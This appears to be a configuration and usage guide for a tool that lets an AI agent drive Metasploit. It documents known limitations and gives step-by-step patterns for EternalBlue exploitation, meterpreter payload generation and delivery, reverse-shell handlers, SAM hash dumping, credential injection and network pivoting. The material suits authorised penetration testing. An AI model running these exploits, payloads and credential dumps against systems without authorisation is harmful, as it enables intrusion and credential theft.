  - "post_module known limitation: post modules that call create_credential — post/windows/gather/hashdump, smart_hashdump, post/multi/gather/credentials/*, mimikatz_dynwrapx — trigger an ActiveRecord 'Session can't be blank' error during DB write because the session row isn't tracked in the framework's session table when sessions are created over msfrpcd. The dump halts before hashes reach the agent. Workaround for credential extraction: call session_command(session_id, 'hashdump') — runs hashdump as a meterpreter built-in (no DB write, no AR path), returns the full SAM dump. Verified live on Blue: extracted Administrator/haris/Guest hashes cleanly. Non-credential post modules (enum_logged_on_users, enum_shares, gather/checkvm, gather/dumplinks, recon/*) work fine through post_module."

  - "PostgreSQL + msfdb auto-init at container start (May 2026). Without DB the workspace methods (db_nmap, list_hosts, list_services, list_creds, list_loot, list_notes, db_import) return '[-] Database not connected'. msfrpcd reads /usr/share/metasploit-framework/config/database.yml on startup; the entrypoint also runs `msfdb init` (NOT `msfdb init --use-defaults` — Kali's msfdb is strict about exactly one positional arg and the latter falls through to usage banner with exit 0, silently failing). Each new shared console additionally issues `db_connect -y <yaml>` defensively in case the daemon-side connection drops."

  - "Server-side concurrency: `_op_lock` (asyncio.Lock) serializes ALL operations that touch shared state — the msfconsole pipeline AND meterpreter session calls. Without it, two concurrent tools/call requests on the same shared console interleave their write/read cycles (the first reader drains output for everyone), and concurrent meterpreter run_with_output on the same session triggers KeyError 'data' from pymetasploit3. Verified live: list_hosts/list_services/list_creds issued as a 3-call batch all returned through list_hosts pre-fix; portfwd_* batched with session_command on session 1 all errored 'data' pre-fix. With the lock, the same batches return distinct correct outputs."

# ── Usage patterns ────────────────────────────────────────────────────────
usage_patterns:
  - name: "Search for an exploit by CVE"
    method: "search_modules"
    args: {query: "ms17-010", type: "exploit"}
    when: "Find Metasploit modules matching a CVE, software, or service. Returns parsed list with module path, type, and one-line info. Use this BEFORE check_vuln or run_exploit to confirm the right module path."

  - name: "Confirm target is vulnerable before exploiting"
    method: "check_vuln"
    args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "{TARGET}"}
    when: "Run a scanner module to verify vulnerability without launching the actual exploit. Auxiliary scanners typically don't trigger AV/IDS the way exploits do. Returns 'Host is likely VULNERABLE' / 'NOT VULNERABLE' / 'CHECK_FAILED'."

  - name: "Generate a Windows meterpreter payload (.exe)"
    method: "generate_payload"
    args: {payload: "windows_reverse_tcp", lhost: "{LHOST}", lport: 4444, format: "exe"}
    when: "Generate a Windows .exe meterpreter for delivery (USB drop, RCE upload, file-write injection). Returns base64-encoded binary. Decode and write to /session/payload.exe; transfer to target via your delivery primitive (curl-upload, smbclient put, xp_cmdshell, etc.)."

  - name: "Start a listener for the payload"
    method: "handler"
    args: {payload: "windows_reverse_tcp", lhost: "{LHOST}", lport: 4444, exit_on_session: false}
    when: "Always START the handler BEFORE delivering the payload — otherwise callback fails with no listener. Use exit_on_session=false for multi-session campaigns; true for single-shot. Handler runs as a msfrpcd background job; persists across MCP calls."

  - name: "Run an exploit against a confirmed-vulnerable target"
    method: "run_exploit"
    args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "{TARGET}", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "{LHOST}", lport: 4444}
    when: "Execute an exploit module. If successful, creates a session that persists in msfrpcd. Use after check_vuln confirms vulnerability (don't burn the exploit on a non-vulnerable target). Returns session_id on success — capture it for follow-up session_command / post_module calls."

  - name: "List active sessions"
    method: "list_sessions"
    args: {}
    when: "Enumerate meterpreter / shell sessions in msfrpcd memory. Use after run_exploit to confirm session creation, and periodically during long engagements to detect dropped sessions."

  - name: "Run a command in an established session"
    method: "session_command"
    args: {session_id: 1, command: "getuid"}
    when: "Interact with an existing session (meterpreter or shell). For meterpreter, common commands: sysinfo, getuid, getsystem, ipconfig, hashdump, ps, getpid, migrate <pid>. For raw shells: just the OS command (whoami, ipconfig /all, etc.)."

  - name: "One-shot command via exploit (no session)"
    method: "exec_command"
    args: {module: "exploit/multi/handler", payload: "cmd/unix/reverse_bash", lhost: "{LHOST}", lport: 4445, command: "id; uname -a"}
    when: "Use for command-injection exploits where you just need to RUN something and get output, no session needed. Faster than run_exploit + session_command sequence; less stealth than a proper session."

  - name: "Run a post-exploitation module on a session"
    method: "post_module"
    args: {module: "post/windows/gather/enum_logged_on_users", session_id: 1}
    when: "Run a Metasploit post module against an existing meterpreter session (raw shells often won't work — convert via session_upgrade). Common picks: post/windows/gather/enum_logged_on_users (recent profiles + currently-logged-in SIDs), post/multi/recon/local_exploit_suggester (kernel-exploit candidates), post/windows/manage/migrate (move to a stable process). For credential extraction (hashdump / smart_hashdump) use session_command(session_id, 'hashdump') instead — see the post_module gotcha for the AR/DB limitation."

  - name: "Dump SAM hashes (workaround for post_module credential AR limitation)"
    method: "session_command"
    args: {session_id: 1, command: "hashdump"}
    when: "post_module post/windows/gather/hashdump trips an ActiveRecord 'Session can't be blank' error during DB write and never returns the hashes to the agent (verified live on Blue, Win7 SP1). meterpreter has hashdump as a built-in command that bypasses the post-module DB path entirely — use session_command for SAM dumping. The output format matches mimikatz: 'user:rid:lm-hash:nt-hash:::'."

  - name: "Pivot through a compromised host into an internal subnet"
    method: "route_add"
    args: {subnet: "10.10.20.0", netmask: "255.255.255.0", session_id: 1}
    when: "After establishing meterpreter on a host that bridges into an internal network. Subsequent metasploit modules targeting IPs in 10.10.20.0/24 will route through session 1. Pair with portfwd_add when you want non-msf tools (impacket, hydra, custom scripts) to reach those internal hosts via localhost:<local_port>."

  # ─────────── Extension mechanism via run_console / run_resource_script ───────────
  # Concrete patterns showing how to reach msfconsole functionality NOT exposed
  # as a named method. These two escape hatches ARE the recipe/extension system —
  # anything msfconsole can interpret can be sent through them.

  - name: "Manage workspaces (multi-engagement isolation)"
    method: "run_console"
    args: {command: "workspace -a corp_engagement"}
    when: "Create or switch metasploit workspaces. Default workspace is shared; for multi-target engagements use `workspace -a <name>` to add, `workspace <name>` to switch, `workspace -l` to list, `workspace -d <name>` to delete. All db_nmap / list_hosts / list_creds / etc. operate on the current workspace."

  - name: "Add a credential discovered outside metasploit"
    method: "run_console"
    args: {command: "creds add user:admin password:'P@ssw0rd!' host:10.10.10.40 port:445 service_name:smb realm:CORP"}
    when: "When responder catches an NTLM hash, hydra cracks a password, or you find creds in a config file — inject them into the workspace creds table so subsequent metasploit modules (psexec, smb_login, etc.) can use them. list_creds will then show the entry."

  - name: "Set a global option (saves typing across many module invocations)"
    method: "run_console"
    args: {command: "setg LHOST 10.10.16.57"}
    when: "Most modules need LHOST/LPORT/RHOSTS. setg makes the value sticky across `use module` calls. Pair with `save` to persist across msfrpcd restarts. Use `unsetg <var>` to clear."

  - name: "Query workspace state msfconsole exposes but no named method covers"
    method: "run_console"
    args: {command: "vulns"}
    when: "vulns lists discovered vulnerabilities (populated by some auxiliary scanners). Same pattern for `analyze` (correlates hosts/services/creds), `loot -d <id>` (delete a loot entry), `hosts -d <ip>` (delete a host)."

  - name: "Load and use an msfconsole plugin"
    method: "run_console"
    args: {command: "load wmap"}
    when: "msfconsole has plugins (wmap for web app fuzzing, nessus/openvas integrations, sounds, etc.). After load, the plugin's commands become available — use run_console for each. `plugins` lists loaded; `unload <plugin>` removes."

  - name: "Multi-step recipe via inline resource script"
    method: "run_resource_script"
    args:
      commands: |
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        set LHOST 10.10.16.57
        set LPORT 4444
        set ExitOnSession false
        exploit -j
        use post/windows/manage/migrate
        set SESSION 1
        set NAME explorer.exe
        run
    when: "When a workflow needs MULTIPLE msfconsole commands chained (handler setup + module configuration + execution + post-exploit). run_resource_script accepts inline content — no need to write a .rc file. For one-shot single commands prefer run_console."

  - name: "Run any niche msfconsole command (the safety hatch)"
    method: "run_console"
    args: {command: "show advanced"}
    when: "When no named method covers the operation — `show <category>` (exploits/payloads/encoders/nops/auxiliary/post/evasion), `route flush`, `portfwd flush`, `route get <ip>`, `version`, `banner`, `spool <file>` (capture output to file), `makerc <file>` (record session into rc), `irb`-pry-style debugging IS NOT supported here. Anything msfconsole interprets as a single command works."

# ── Help commands ─────────────────────────────────────────────────────────
help_commands:
  - command: "msfconsole --version"
    purpose: "Verify Metasploit version + ensure metasploit-framework is installed"
  - command: "msfvenom --list payloads | head -20"
    purpose: "Sample of available payloads (full list is ~600)"
  - command: "msfvenom --list formats"
    purpose: "All supported output formats for generate_payload"
